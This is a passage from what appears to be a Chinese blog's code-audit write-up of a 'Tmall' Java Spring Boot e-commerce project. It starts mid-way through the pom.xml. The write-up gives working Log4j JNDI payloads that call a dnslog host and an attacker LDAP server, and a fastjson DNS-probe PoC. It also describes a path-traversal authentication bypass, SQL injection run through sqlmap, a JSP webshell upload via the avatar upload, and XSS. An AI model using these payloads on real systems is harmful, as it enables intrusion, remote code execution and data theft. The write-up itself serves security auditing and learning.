class="line">    <span class="comment">&lt;!-- Spring --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-logging<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-actuator<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-tomcat<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-log4j2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- log4j2 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.20.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.20.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-jul<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.20.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.20.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-slf4j-impl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.20.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">finalName</span>&gt;</span>tmall<span class="tag">&lt;/<span class="name">finalName</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!--引入配置文件--&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">resource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">directory</span>&gt;</span>src/main/resources<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filtering</span>&gt;</span>false<span class="tag">&lt;/<span class="name">filtering</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!--引入静态文件--&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">resource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">directory</span>&gt;</span>src/main/webapp<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">targetPath</span>&gt;</span>META-INF/resources<span class="tag">&lt;/<span class="name">targetPath</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filtering</span>&gt;</span>false<span class="tag">&lt;/<span class="name">filtering</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/**<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.10<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">分析上面的pom.xml文件与组件版本</span><br><span class="line"></span><br><span class="line">他引入了log4j-core是log4j的源码可能存在log4j漏洞</span><br><span class="line">log4j-api 是接口。不存在漏洞</span><br><span class="line"></span><br><span class="line">fastjson1.2.83 网上存在该漏洞的poc</span><br><span class="line"></span><br><span class="line">还引入了解析jsp的依赖,那可能存在文件上传</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Log4j漏洞"><a href="#Log4j漏洞" class="headerlink" title="Log4j漏洞"></a>Log4j漏洞</h2><p>触发函数为logger.info或者logger.error</p>
<p>搜索函数logger.info时.有几个参数都可控,但是他们限定了传入类型是Integer,所以没有产生漏洞</p>
<p>但是在ForeUserController.java中</p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Tmall%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241130222139117.png" alt="image-20241130222139117"></p>
<p>他的类型为String,所以构成漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;jndi:ldap://$&#123;env:OS&#125;.mq6bqf.dnslog.cn&#125;</span><br><span class="line">也可以直接配合jndi注入命令执行</span><br><span class="line">$&#123;jndi:ldap://192.168.0.93:1389/o0pmya&#125;</span><br></pre></td></tr></table></figure>

<h2 id="fastjson漏洞"><a href="#fastjson漏洞" class="headerlink" title="fastjson漏洞"></a>fastjson漏洞</h2><p>已确定了Fastjson版本存在问题，进一步寻找触发Fastjson的漏洞点。我们关注两个函数 JSON.parse() 和 JSON.parseObject() 。</p>
<p>本项目存在 JSON.parseObject(),如下所示</p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Tmall%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241130223349497.png" alt="image-20241130223349497"></p>
<p>双击进入 ProductController.java 文件，问题代码出现在了 第151行 ，使用 JSON.parseObject() 方 法反序列化了 propertyJson 参数，我们向上追踪 propertyJson 参数，该参数是 添加产品信息 接口中 产品属性JSON 字段</p>
<p>访问管理后台，经过一番查找，发现漏洞输入点位于 所有产品-添加一件产品 功能下。 点击添加一件产品后，使用BurpSuite抓包拦截记录请求数据包，发现请求地址为 admin&#x2F;product ，并 且产品属性信息为 propertyJson 字段参数，如下图所示：</p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Tmall%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241130223648178.png" alt="image-20241130223648178"></p>
<p>将上面的数据包，发送到Repeater模块，用于后续漏洞验证。 对 propertyJson 参数值进行URL解码，发现为JSON格式字符串，如下图所示：</p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Tmall%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241130223729740.png" alt="image-20241130223729740"></p>
<p>验证漏洞poc</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;cdm2bs.dnslog.cn&quot;&#125; </span><br></pre></td></tr></table></figure>

<p>点击发送数据包后，访问NDSLog地址，点击 Refresh Record ，可以看到获取到回显信息，成功触发了Fastjson漏洞</p>
<h1 id="单点漏洞"><a href="#单点漏洞" class="headerlink" title="单点漏洞"></a>单点漏洞</h1><h2 id="鉴权绕过"><a href="#鉴权绕过" class="headerlink" title="鉴权绕过"></a>鉴权绕过</h2><p>在pom.xml文件中没有搜索到<strong>jwt</strong>和<strong>shiro</strong>关键字,接着去看它的目录结构是否存在<strong>filter</strong>或<strong>Interceptor</strong></p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Tmall%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241130224225159.png" alt="image-20241130224225159"></p>
<p>if判断包含&#x2F;admin&#x2F;login与&#x2F;admin&#x2F;account吗,包含则放行</p>
<p>getRequestURI().contains代表获取他的路径并且判断里面是否包含</p>
<p>如果是getRequestURI()与getRequestURL()获取路径可以绕过</p>
<p>getServletPath()方法是绕过不了</p>
<p>我们通过&#x2F;admin&#x2F;login&#x2F;..&#x2F;xxx即可绕过鉴权</p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Tmall%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241130224859730.png" alt="image-20241130224859730"></p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Tmall%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241130225032858.png" alt="image-20241130225032858"></p>
<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>因为运用了mybatis所以全局搜索关键词<code>$&#123;</code></p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Tmall%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241130225219665.png" alt="image-20241130225219665"></p>
<p>通过代码我们跟踪到工具类 OrderUtil.java</p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Tmall%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241130225807222.png" alt="image-20241130225807222"></p>
<p>第一个构造函数没有被调用,查看第二个构造函数</p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Tmall%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241130225959078.png" alt="image-20241130225959078"></p>
<p>查看第一个参数的调用.发现它是可控,并且是String类型</p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Tmall%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241130230030890.png" alt="image-20241130230030890"></p>
<p>定位到它的路由抓包,放入sqlmap即可出</p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Tmall%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241130230131148.png" alt="image-20241130230131148"></p>
<h2 id="前台文件上传"><a href="#前台文件上传" class="headerlink" title="前台文件上传"></a>前台文件上传</h2><p>后台也有同样功能,但是我们选择危害严重的</p>
<p>上传文件的功能一般在头像上传处</p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Tmall%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241130230321759.png" alt="image-20241130230321759"></p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Tmall%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241130230404362.png" alt="image-20241130230404362"></p>
<p>定位到代码中,发现没有对文件名与内容进行检测，获取文件名然后进行uuid编码返回，保存路径也写了,并且引入了jsp依赖</p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Tmall%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241130230438478.png" alt="image-20241130230438478"></p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Tmall%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241130230551212.png" alt="image-20241130230551212"></p>
<p>直接上传jsp马,然后连接</p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Tmall%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241130230910125.png" alt="image-20241130230910125"></p>
<p>文件保存路径在代码中有，拼接上即可</p>
<p>res&#x2F;images&#x2F;item&#x2F;userProfilePicture&#x2F;</p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Tmall%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241130231141587.png" alt="image-20241130231141587"></p>
<h2 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h2><p>它的代码没有任何过滤了xss漏洞的代码,所以应该全局都存在,xss在黑盒测试简单,我们见框就插</p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Tmall%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241130231445104.png" alt="image-20241130231445104"></p>
]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
</search>
